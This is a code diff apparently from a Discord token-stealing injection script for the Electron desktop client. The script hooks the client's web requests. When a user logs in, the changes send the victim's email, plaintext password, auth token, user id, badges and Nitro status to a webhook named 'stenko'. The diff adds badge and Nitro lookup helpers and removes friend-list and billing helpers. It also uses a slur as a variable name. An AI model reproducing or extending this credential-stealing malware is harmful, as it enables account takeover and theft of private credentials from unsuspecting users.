@@ -72,7 +72,6 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) =>
             })
         }
 })
-
 function SendToWebhook(what) {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
@@ -83,6 +82,95 @@ function SendToWebhook(what) {
     `, !0).then((token => {}))
 }
 
+function GetNitro(flags) {
+	if (flags == 0) {
+		return "no nitro"
+	}
+	if (flags == 1) {
+		return "nitro classic"
+	}
+	if (flags == 2) {
+		return "nitro boost"
+	} else {
+		return "no nitro"
+	}
+}
+
+function GetRBadges(flags) {
+	const Discord_Employee = 1;
+	const Partnered_Server_Owner = 2;
+	const HypeSquad_Events = 4;
+	const Bug_Hunter_Level_1 = 8;
+	const Early_Supporter = 512;
+	const Bug_Hunter_Level_2 = 16384;
+	const Early_Verified_Bot_Developer = 131072;
+	var badges = "";
+	if ((flags & Discord_Employee) == Discord_Employee) {
+		badges += "discord staff "
+	}
+	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+		badges += "partnered server owner "
+	}
+	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+		badges += "hypesquad events "
+	}
+	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+		badges += "bug hunter tier 1 "
+	}
+	if ((flags & Early_Supporter) == Early_Supporter) {
+		badges += "early supporter "
+	}
+	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+		badges += "bug hunter tier 2 "
+	}
+	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+		badges += "verified bot developer "
+	}
+	if (badges == "") {
+		badges = ""
+	}
+	return badges
+}
+
+function GetBadges(flags) {
+	const Discord_Employee = 1;
+	const Partnered_Server_Owner = 2;
+	const HypeSquad_Events = 4;
+	const Bug_Hunter_Level_1 = 8;
+	const House_Bravery = 64;
+	const House_Brilliance = 128;
+	const House_Balance = 256;
+	const Early_Supporter = 512;
+	const Bug_Hunter_Level_2 = 16384;
+	const Early_Verified_Bot_Developer = 131072;
+	var badges = "";
+	if ((flags & Discord_Employee) == Discord_Employee) {
+		badges += "discord staff "
+	}
+	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+		badges += "partnered server owner "
+	}
+	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+		badges += "hypesquad events "
+	}
+	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+		badges += "bug hunter tier 1 "
+	}
+	if ((flags & Early_Supporter) == Early_Supporter) {
+		badges += "early supporter "
+	}
+	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+		badges += "bug hunter tier 2 "
+	}
+	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+		badges += "verified bot developer "
+	}
+	if (badges == "") {
+		badges = "no badges"
+	}
+	return badges
+}
+
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -91,54 +179,6 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-
-function totalFriends() {
-	var f = JSON.parse(info4)
-	const r = f.filter((user) => {
-
-		return user.type == 1
-	})
-	return r.length
-}
-
-function CalcFriends() {
-	var f = JSON.parse(info4)
-	const r = f.filter((user) => {
-		return user.type == 1
-	})
-	var gay = "";
-	for (z of r) {
-		var b = GetRBadges(z.user.public_flags)
-		if (b != "") {
-			gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-		}
-	}
-	if (gay == "") {
-		gay = "No Rare Friends"
-	}
-	return gay
-}
-
-function Cool() {
-	const json = JSON.parse(info3)
-	var billing = "";
-	json.forEach(z => {
-		if (z.type == "") {
-			return "\`❌\`"
-		} else if (z.type == 2 && z.invalid != !0) {
-			billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-		} else if (z.type == 1 && z.invalid != !0) {
-			billing += "\`✔️\`" + " :credit_card:"
-		} else {
-			return "\`❌\`"
-		}
-	})
-	if (billing == "") {
-		billing = "\`❌\`"
-	}
-	return billing
-}
-	    
         const json = JSON.parse(info);
         var params = {
             username: "stenko",
@@ -147,16 +187,57 @@ function Cool() {
             embeds: [
                 {
                     "title": "user logged in",
+		    description: "᲼᲼᲼᲼",
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " friends number",
-                            "value": `${totalFriends()}`,
+                            "name": " name",
+			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
+                            "inline": true
+                        },
+                        {
+                            "name": " id",
+                            "value": `\`` + json.id + `\``,
+                            "inline": true
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        },
+                        {
+                            "name": " email",
+                            "value": `\`${email}\``,
+                            "inline": true
+                        },
+                        {
+                            "name": " password",
+                            "value": `\`${password}\``,
                             "inline": true		    
                         },
                         {
-                            "name": " friends discord",
-                            "value": `CalcFriends()`,
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
+                        {
+                            "name": " badges",
+                            "value": `\`${GetBadges(json.flags)}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": " nitro",
+                            "value": `\`${GetNitro(json.premium_type)}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
+                        {
+                            "name": " token",
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
